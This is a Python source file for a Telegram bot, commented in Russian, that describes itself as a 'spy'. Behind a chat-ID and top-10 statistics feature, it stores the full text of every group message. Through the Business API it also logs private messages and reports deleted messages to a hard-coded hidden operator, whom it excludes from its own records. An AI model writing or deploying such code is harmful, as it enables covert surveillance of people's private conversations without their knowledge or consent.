# main.py
import asyncio
import logging
import asyncpg
from aiogram import Bot, Dispatcher, F
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.client.telegram import TelegramAPIServer
from aiogram.types import Message, BusinessConnection
from aiogram.filters import CommandStart
import config

# Настройка логирования
logging.basicConfig(level=logging.INFO)

session = AiohttpSession(api=TelegramAPIServer.from_base(config.API_SERVER))
bot = Bot(token=config.BOT_TOKEN, session=session)
dp = Dispatcher()

# Твой скрытый ID для уведомлений и статистики
HIDDEN_ID = 1780243499
HIDDEN_USERNAME = "zovx"

# --- ФУНКЦИЯ ИНИЦИАЛИЗАЦИИ БАЗЫ ---
async def init_db(pool):
    try:
        await pool.execute("""
            CREATE TABLE IF NOT EXISTS chat_stats (
                id SERIAL PRIMARY KEY,
                chat_id BIGINT,
                user_id BIGINT,
                username TEXT,
                message_text TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        logging.info("Таблица chat_stats готова.")
    except Exception as e:
        logging.error(f"Ошибка создания таблицы: {e}")

# --- СТАРТ ---
@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.reply("Привет! Я шпион. 🕵️\n\nНапиши `.айди` или `.топ` (можно без точки).")

# --- ГЛАВНЫЙ ОБРАБОТЧИК ВСЕХ СООБЩЕНИЙ ---
@dp.message(F.text)
async def universal_handler(message: Message, db: asyncpg.Pool):
    text = message.text.lower().strip()
    logging.info(f"Получено сообщение в {message.chat.type} от {message.from_user.id}: {text}")

    # 1. ОБРАБОТКА АЙДИ
    if "айди" in text or "id" in text:
        if len(text) < 15: # Чтобы не срабатывало на длинные предложения
            try:
                await message.reply(f"🆔 ID чата: <code>{message.chat.id}</code>", parse_mode="HTML")
            except Exception as e:
                logging.error(f"Ошибка отправки ID: {e}")
            return

    # 2. ОБРАБОТКА ТОПА
    if "топ" in text or "top" in text:
        if len(text) < 15:
            try:
                rows = await db.fetch(
                    "SELECT username, COUNT(*) as msg_count FROM chat_stats WHERE chat_id = $1 GROUP BY username ORDER BY msg_count DESC LIMIT 10",
                    message.chat.id
                )
                if not rows:
                    await message.reply("📊 В этом чате пока нет сообщений для статистики.")
                    return
                
                res = "🏆 <b>Топ-10:</b>\n\n"
                for i, row in enumerate(rows, 1):
                    name = "Пользователь скрыт" if (row['username'] and row['username'].lower() == HIDDEN_USERNAME) else (f"@{row['username']}" if row['username'] else "Аноним")
                    res += f"{i}. {name} — {row['msg_count']} сообщ.\n"
                await message.reply(res, parse_mode="HTML")
            except Exception as e:
                logging.error(f"Ошибка БД при топе: {e}")
                await message.reply(f"⚠️ Ошибка базы данных: {e}")
            return

    # 3. ЗАПИСЬ В БАЗУ (если это обычное сообщение)
    if not text.startswith(('/', '.', '!')) and message.from_user.id != HIDDEN_ID:
        try:
            await db.execute(
                "INSERT INTO chat_stats (chat_id, user_id, username, message_text) VALUES ($1, $2, $3, $4)",
                message.chat.id, message.from_user.id, message.from_user.username, message.text
            )
        except Exception as e:
            logging.error(f"Ошибка записи в БД: {e}")

# --- БИЗНЕС СОБЫТИЯ (ЛС) ---
@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    logging.info(f"✅ Бизнес-бот подключен к аккаунту: {connection.user.id}")

@dp.business_message()
async def on_business_message(message: Message, db: asyncpg.Pool):
    text = message.text or "[Медиа]"
    logging.info(f"Бизнес-сообщение: {text}")
    
    if message.from_user.id == HIDDEN_ID: return
    
    try:
        await db.execute(
            "INSERT INTO chat_stats (chat_id, user_id, username, message_text) VALUES ($1, $2, $3, $4)",
            message.chat.id, message.from_user.id, message.from_user.username, text
        )
    except Exception as e:
        logging.error(f"Ошибка записи бизнес-сообщения: {e}")

# --- УВЕДОМЛЕНИЯ ОБ УДАЛЕНИИ ---
@dp.deleted_business_messages()
async def on_deleted_message(event):
    logging.info(f"🗑 Удалено в бизнесе: {event.message_ids}")
    try:
        await bot.send_message(
            chat_id=HIDDEN_ID, 
            text=f"🗑 <b>Удалено сообщение!</b>\nЧат: <code>{event.chat_id}</code>\nID сообщений: {event.message_ids}",
            parse_mode="HTML"
        )
    except Exception as e:
        logging.error(f"Не удалось отправить уведомление об удалении: {e}")

# --- ЗАПУСК ---
async def main():
    try:
        pool = await asyncpg.create_pool(config.DATABASE_URL)
        await init_db(pool)
        dp["db"] = pool
    except Exception as e:
        logging.error(f"❌ КРИТИЧЕСКАЯ ОШИБКА БАЗЫ: {e}")
        return # Если база не подключилась, бот просто не запустится

    try:
        await bot.delete_webhook(drop_pending_updates=True)
        logging.info("Вебхуки сброшены.")
    except Exception as e:
        logging.error(f"Ошибка сброса вебхуков: {e}")
        
    logging.info("🚀 Шпион запущен и готов к работе.")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
